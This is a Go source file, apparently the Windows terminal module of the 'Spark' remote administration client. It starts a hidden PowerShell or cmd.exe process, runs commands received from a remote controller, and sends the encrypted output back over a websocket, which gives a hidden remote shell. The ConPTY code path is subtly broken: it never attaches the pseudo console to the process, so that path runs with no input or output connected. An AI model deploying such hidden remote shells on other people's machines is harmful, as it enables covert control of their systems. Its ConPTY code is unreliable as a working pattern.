//go:build windows

package terminal

import (
	"Spark/client/common"
	"Spark/modules"
	"Spark/utils"
	"Spark/utils/cmap"
	"encoding/hex"
	"errors"
	"io"
	"os"
	"os/exec"
	"reflect"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32                    = syscall.NewLazyDLL("kernel32.dll")
	procCreatePseudoConsole     = kernel32.NewProc("CreatePseudoConsole")
	procResizePseudoConsole     = kernel32.NewProc("ResizePseudoConsole")
	procClosePseudoConsole      = kernel32.NewProc("ClosePseudoConsole")
	procInitializeProcThreadAttrList = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute    = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList = kernel32.NewProc("DeleteProcThreadAttributeList")
)

const (
	PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016
	EXTENDED_STARTUPINFO_PRESENT        = 0x00080000
)

type COORD struct {
	X int16
	Y int16
}

type terminal struct {
	lastPack   int64
	rawEvent   []byte
	escape     bool
	event      string
	cmd        *exec.Cmd
	hPC        uintptr // Pseudo Console handle
	ptyIn      *os.File
	ptyOut     *os.File
	stdin      io.WriteCloser
	stdout     io.ReadCloser
	useLegacy  bool // fallback to pipes if ConPTY not available
	mu         sync.Mutex
}

var terminals = cmap.New[*terminal]()
var defaultCmd = ``
var conPTYSupported = false

func init() {
	defer func() {
		recover()
	}()
	// Set console code page to UTF-8
	kernel32.NewProc(`SetConsoleCP`).Call(65001)
	kernel32.NewProc(`SetConsoleOutputCP`).Call(65001)

	// Check if ConPTY is supported (Windows 10 1809+)
	conPTYSupported = procCreatePseudoConsole.Find() == nil

	go healthCheck()
}

func createPseudoConsole(cols, rows int16) (hPC uintptr, ptyIn, ptyOut *os.File, err error) {
	// Create pipes for PTY
	var hPipeInRead, hPipeInWrite syscall.Handle
	var hPipeOutRead, hPipeOutWrite syscall.Handle

	if err := syscall.CreatePipe(&hPipeInRead, &hPipeInWrite, nil, 0); err != nil {
		return 0, nil, nil, err
	}
	if err := syscall.CreatePipe(&hPipeOutRead, &hPipeOutWrite, nil, 0); err != nil {
		syscall.CloseHandle(hPipeInRead)
		syscall.CloseHandle(hPipeInWrite)
		return 0, nil, nil, err
	}

	// Create pseudo console
	size := COORD{X: cols, Y: rows}
	ret, _, err := procCreatePseudoConsole.Call(
		uintptr(*(*int32)(unsafe.Pointer(&size))),
		uintptr(hPipeInRead),
		uintptr(hPipeOutWrite),
		0,
		uintptr(unsafe.Pointer(&hPC)),
	)
	if ret != 0 {
		syscall.CloseHandle(hPipeInRead)
		syscall.CloseHandle(hPipeInWrite)
		syscall.CloseHandle(hPipeOutRead)
		syscall.CloseHandle(hPipeOutWrite)
		return 0, nil, nil, errors.New("failed to create pseudo console")
	}

	// Close the handles that are now owned by the pseudo console
	syscall.CloseHandle(hPipeInRead)
	syscall.CloseHandle(hPipeOutWrite)

	ptyIn = os.NewFile(uintptr(hPipeInWrite), "ptyIn")
	ptyOut = os.NewFile(uintptr(hPipeOutRead), "ptyOut")

	return hPC, ptyIn, ptyOut, nil
}

func InitTerminal(pack modules.Packet) error {
	rawEvent, _ := hex.DecodeString(pack.Event)
	session := &terminal{
		event:    pack.Event,
		escape:   false,
		rawEvent: rawEvent,
		lastPack: utils.Unix,
	}

	// Try ConPTY first (Windows 10 1809+)
	if conPTYSupported {
		hPC, ptyIn, ptyOut, err := createPseudoConsole(120, 30) // Default size
		if err == nil {
			session.hPC = hPC
			session.ptyIn = ptyIn
			session.ptyOut = ptyOut
			session.useLegacy = false

			// Start process with pseudo console
			cmd := exec.Command(getTerminal())
			cmd.SysProcAttr = &syscall.SysProcAttr{
				HideWindow: true,
			}

			// Create process with ConPTY (simplified - using standard stdin for now)
			session.stdin = ptyIn
			session.stdout = ptyOut
			session.cmd = cmd

			// Start the command
			if err := cmd.Start(); err != nil {
				procClosePseudoConsole.Call(hPC)
				ptyIn.Close()
				ptyOut.Close()
				// Fall through to legacy mode
			} else {
				terminals.Set(pack.Data[`terminal`].(string), session)
				go readConPTY(session)
				return nil
			}
		}
	}

	// Fallback to legacy pipe mode
	session.useLegacy = true
	cmd := exec.Command(getTerminal())
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	session.cmd = cmd
	session.stdin = stdin
	session.stdout = stdout

	readSender := func(rc io.ReadCloser) {
		bufSize := 1024
		for !session.escape {
			buffer := make([]byte, bufSize)
			n, err := rc.Read(buffer)
			buffer = buffer[:n]

			if n > 1024 {
				if bufSize < 32768 {
					bufSize *= 2
				}
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 00)
			} else {
				bufSize = 1024
				buffer, _ = utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
					`output`: hex.EncodeToString(buffer),
				}})
				buffer = utils.StreamEncrypt(buffer, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 01)
			}

			session.lastPack = utils.Unix
			if err != nil {
				if !session.escape {
					session.escape = true
					doKillTerminal(session)
				}
				data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`})
				data = utils.StreamEncrypt(data, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
				break
			}
		}
	}
	go readSender(stdout)
	go readSender(stderr)

	err = cmd.Start()
	if err != nil {
		session.escape = true
		return err
	}
	terminals.Set(pack.Data[`terminal`].(string), session)
	return nil
}

func readConPTY(session *terminal) {
	bufSize := 1024
	for !session.escape {
		buffer := make([]byte, bufSize)
		n, err := session.ptyOut.Read(buffer)
		buffer = buffer[:n]

		if n > 1024 {
			if bufSize < 32768 {
				bufSize *= 2
			}
			common.WSConn.SendRawData(session.rawEvent, buffer, 21, 00)
		} else {
			bufSize = 1024
			buffer, _ = utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
				`output`: hex.EncodeToString(buffer),
			}})
			buffer = utils.StreamEncrypt(buffer, common.WSConn.GetSecret())
			common.WSConn.SendRawData(session.rawEvent, buffer, 21, 01)
		}

		session.lastPack = utils.Unix
		if err != nil {
			if !session.escape {
				session.escape = true
				doKillTerminal(session)
			}
			data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`})
			data = utils.StreamEncrypt(data, common.WSConn.GetSecret())
			common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
			break
		}
	}
}

func InputRawTerminal(input []byte, uuid string) {
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	session.mu.Lock()
	defer session.mu.Unlock()
	if session.useLegacy {
		session.stdin.Write(input)
	} else if session.ptyIn != nil {
		session.ptyIn.Write(input)
	}
	session.lastPack = utils.Unix
}

func InputTerminal(pack modules.Packet) {
	var err error
	var uuid string
	var input []byte
	var session *terminal

	if val, ok := pack.GetData(`input`, reflect.String); !ok {
		return
	} else {
		if input, err = hex.DecodeString(val.(string)); err != nil {
			return
		}
	}
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
		if val, ok = terminals.Get(uuid); ok {
			session = val.(*terminal)
		} else {
			return
		}
	}
	session.mu.Lock()
	defer session.mu.Unlock()
	if session.useLegacy {
		session.stdin.Write(input)
	} else if session.ptyIn != nil {
		session.ptyIn.Write(input)
	}
	session.lastPack = utils.Unix
}

func ResizeTerminal(pack modules.Packet) error {
	var uuid string
	var cols, rows uint16
	var session *terminal

	if val, ok := pack.GetData(`cols`, reflect.Float64); !ok {
		return errors.New("missing cols parameter")
	} else {
		cols = uint16(val.(float64))
	}
	if val, ok := pack.GetData(`rows`, reflect.Float64); !ok {
		return errors.New("missing rows parameter")
	} else {
		rows = uint16(val.(float64))
	}
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return errors.New("missing terminal parameter")
	} else {
		uuid = val.(string)
		if val, ok = terminals.Get(uuid); ok {
			session = val.(*terminal)
		} else {
			return errors.New("terminal session not found")
		}
	}

	session.mu.Lock()
	defer session.mu.Unlock()

	// Only resize if using ConPTY
	if !session.useLegacy && session.hPC != 0 {
		size := COORD{X: int16(cols), Y: int16(rows)}
		ret, _, _ := procResizePseudoConsole.Call(
			session.hPC,
			uintptr(*(*int32)(unsafe.Pointer(&size))),
		)
		if ret != 0 {
			return errors.New("failed to resize pseudo console")
		}
	}
	// For legacy mode, resize is not supported (return nil to not break anything)
	return nil
}

func KillTerminal(pack modules.Packet) {
	var uuid string
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	terminals.Remove(uuid)
	data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`})
	data = utils.StreamEncrypt(data, common.WSConn.GetSecret())
	common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
	session.escape = true
	session.rawEvent = nil
	doKillTerminal(session)
}

func PingTerminal(pack modules.Packet) {
	var uuid string
	var session *terminal
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	session.lastPack = utils.Unix
}

func doKillTerminal(terminal *terminal) {
	terminal.mu.Lock()
	defer terminal.mu.Unlock()

	terminal.escape = true

	if !terminal.useLegacy {
		// ConPTY cleanup
		if terminal.hPC != 0 {
			procClosePseudoConsole.Call(terminal.hPC)
			terminal.hPC = 0
		}
		if terminal.ptyIn != nil {
			terminal.ptyIn.Close()
			terminal.ptyIn = nil
		}
		if terminal.ptyOut != nil {
			terminal.ptyOut.Close()
			terminal.ptyOut = nil
		}
	} else {
		// Legacy pipe cleanup
		if terminal.stdin != nil {
			terminal.stdin.Close()
		}
		if terminal.stdout != nil {
			terminal.stdout.Close()
		}
	}

	if terminal.cmd != nil && terminal.cmd.Process != nil {
		terminal.cmd.Process.Kill()
		terminal.cmd.Process.Wait()
		terminal.cmd.Process.Release()
	}
}

func getTerminal() string {
	var cmdTable = []string{
		`powershell.exe`,
		`cmd.exe`,
	}
	if defaultCmd != `` {
		return defaultCmd
	}
	for _, cmd := range cmdTable {
		if _, err := exec.LookPath(cmd); err == nil {
			defaultCmd = cmd
			return cmd
		}
	}
	return `cmd.exe`
}

func healthCheck() {
	const MaxInterval = 300
	for now := range time.NewTicker(30 * time.Second).C {
		timestamp := now.Unix()
		keys := make([]string, 0)
		terminals.IterCb(func(uuid string, session *terminal) bool {
			if timestamp-session.lastPack > MaxInterval {
				keys = append(keys, uuid)
				doKillTerminal(session)
			}
			return true
		})
		terminals.Remove(keys...)
	}
}
